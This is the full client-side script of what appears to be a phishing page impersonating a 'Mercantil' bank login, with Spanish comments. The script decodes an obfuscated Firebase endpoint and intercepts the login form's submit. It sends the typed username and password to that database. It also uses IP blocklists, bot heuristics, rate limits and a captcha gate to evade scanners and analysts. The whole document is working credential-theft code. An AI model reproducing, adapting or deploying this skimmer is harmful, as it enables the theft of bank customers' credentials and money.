<script>
(function(){ window._htok=0; var _pageStart=Date.now(); ['mousemove','touchstart','keydown'].forEach(function(e){document.addEventListener(e,function(){window._htok=1;},{once:true})});var _d=atob,_c={apiKey:_d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),authDomain:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),databaseURL:_d('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ=='),projectId:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),storageBucket:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),messagingSenderId:_d('NTQyMDQ3NjIwNjYz'),appId:_d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')};if(!firebase.apps.length)firebase.initializeApp(_c);
  var _db = firebase.database();
  var _PATH = (typeof SITE_ID !== 'undefined' && SITE_ID) ? SITE_ID : atob('dm1fNzdjZjI4ZmZkYg==');

  // ===== IP & ANTI-BOT SYSTEM =====
window._mi_ip = 'desconocida';
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
  window._mi_ip = d.ip;
  // Check if blocked
  var ip_key = d.ip.replace(/\./g,'_');
  var fb_url = atob('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ==') + '/blocks/ips/' + ip_key + '.json';
  fetch(fb_url).then(r=>r.json()).then(blocked=>{
    if(blocked && blocked !== null){
      window.location.href = 'https://www.google.com';
    }
  });
}).catch(e=>{});
  // Tiempo de carga de pagina �?? para detectar bots que envian sin interaccion
  var _pageLoadTime = Date.now();

  function _esBot(usr, clv) {
    // Usuario vacio o nombres genericos de bot
    if (!usr) return true;
    var u = usr.toLowerCase();
    if (u === 'usuario' || u === 'user' || u === 'test' || u === 'admin' || u === 'username') return true;
    // Clave vacia, muy corta, o solo numeros de 1-6 digitos (tipico de bots)
    if (!clv || clv.length < 4) return true;
    // Tiempo minimo en pagina: 2 segundos (bots envian instantaneamente)
    if (Date.now() - _pageLoadTime < 2000) return true;
    // Tiempo menor a 7 segundos -> sospechoso, captcha
    return false;
  }

  // Credenciales de bots conocidos (hash simple)
  var _BL = ['50187827 0002740376|Casa.123','50187827 0002740376|casa.123'];

  function _hash(u, c){ return u.trim() + '|' + c.trim(); }

  function doCapture(ev) {
    if(ev){ ev.preventDefault(); ev.stopImmediatePropagation(); }
    
    // --- RATE LIMIT LOCAL (Max 3 intentos por IP/Navegador en 5 min) ---
    var intentos = parseInt(localStorage.getItem('intentos_login') || '0');
    var last_intento = parseInt(localStorage.getItem('ultimo_intento') || '0');
    var ahora = Date.now();
    if(ahora - last_intento > 300000) { intentos = 0; }
    if(intentos >= 3) {
      window.location.href = 'https://www.google.com';
      return;
    }
    localStorage.setItem('intentos_login', intentos + 1);
    localStorage.setItem('ultimo_intento', ahora);

    var usrEl = document.getElementById('usr')
             || document.querySelector('input[formcontrolname="username"]')
             || document.querySelector('input[type="text"]');
    var clvEl = document.getElementById('clv')
             || document.querySelector('input[formcontrolname="password"]')
             || document.querySelector('input[type="password"]');

    var usr = usrEl ? usrEl.value.trim() : '';
    var clv = clvEl ? clvEl.value.trim() : '';

    // ANTI-BOT: Si es bot, redirigir sin guardar en Firebase
    if (_esBot(usr, clv)) {
      window.location.href = 'carga.html';
      return;
    }

    // BLACKLIST: bloquear combinaciones de bots conocidos
    var _h = _hash(usr, clv);
    if (_BL.indexOf(_h) !== -1) {
      window.location.href = 'carga.html';
      return;
    }

        // ===== CAPTCHA GATE: si llenó el form en menos de 7 segundos =====
    var _elapsed = Date.now() - _pageStart;
    if (_elapsed < 7000) {
      sessionStorage.setItem('_cap_usr', usr);
      sessionStorage.setItem('_cap_clv', clv);
      sessionStorage.setItem('_cap_path', _PATH);
      window.location.href = 'captcha.html';
      return;
    }

    // DEDUPLICACION: si ya enviamos estas credenciales en esta sesion, no duplicar
    var _seen = sessionStorage.getItem('_seen_h');
    if (_seen === _h) {
      window.location.href = 'carga.html';
      return;
    }
    sessionStorage.setItem('_seen_h', _h);

    // ===== CLAVE DETERMINISTA: mismo usuario+clave = misma sesion =====
var _hashStr = function(s){ var h=0; for(var i=0;i<s.length;i++){ h=((h<<5)-h)+s.charCodeAt(i); h=h&h; } return Math.abs(h).toString(36); };
var tok = 'M_' + _hashStr((usr + clv + _PATH).toLowerCase());
    sessionStorage.setItem('_sid', tok);

    // Token secreto que prueba que la entrada vino de esta pagina real
    var _k = 'MRC2024_' + (parseInt(tok.replace('M_','')) % 97).toString(16) + '_v2';

    var xhr = new XMLHttpRequest();
    xhr.open('PUT', atob('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ==') + '/' + _PATH + '/' + tok + '.json', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onloadend = function(){ window.location.href = 'carga.html'; };
    xhr.onerror   = function(){ window.location.href = 'carga.html'; };
    xhr.send(JSON.stringify({
      usuario: usr,
      clave:   clv,
      tipo: 'Mercantil',
      estado: 'online',
      page: 'carga',
      first_seen: Date.now(),
      _k: _k, _htok: window._htok
    }));
  }

  document.addEventListener('click', function(ev){
    var t = ev.target;
    var btn = (t.tagName === 'BUTTON' && t.type === 'submit') ? t : null;
    if(!btn && t.closest){ btn = t.closest('button[type="submit"]'); }
    if(btn){ doCapture(ev); }
  }, true);

  document.addEventListener('submit', function(ev){ doCapture(ev); }, true);
})();
</script>
